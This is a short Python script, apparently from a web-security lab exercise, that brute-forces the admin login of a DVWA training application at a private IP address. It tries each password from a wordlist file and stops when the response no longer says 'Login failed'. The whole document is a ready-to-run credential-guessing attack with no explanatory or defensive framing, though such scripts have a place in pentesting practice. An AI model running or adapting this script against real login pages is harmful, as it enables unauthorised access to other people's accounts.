import requests

target_url = 'http://10.0.2.14/dvwa/login.php'

data_dict = {'username': 'admin', 'password': '', 'Login': 'submit'}

with open('passwords.txt', 'r') as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict['password'] = word

        response = requests.post(target_url, data=data_dict)
        content = response.content.decode()

        if 'Login failed' not in content:
            print(f'[+] Got the password --> {word}')
            exit()

print('[-] Reached end of list.')
